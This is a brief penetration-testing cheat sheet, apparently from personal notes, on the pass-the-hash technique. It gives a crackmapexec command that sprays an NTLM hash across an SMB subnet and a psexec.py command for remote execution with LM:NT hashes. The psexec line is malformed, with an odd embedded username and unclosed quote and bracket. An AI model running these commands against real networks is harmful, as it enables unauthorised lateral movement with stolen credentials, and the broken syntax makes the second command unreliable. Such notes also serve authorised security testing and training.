# Pass The Hash

We can pass the hash instead of trying to crack it.

## Crackmapexec
```sh
> crackmapexec smb 192.168.1.0/24 -u "<Username>" -H "<PasswordHash>" --local-auth
```

## psexec.py 
```sh
> psexec.py <username: "frank castle":@<IP Address -hashes <LM:NT>  
```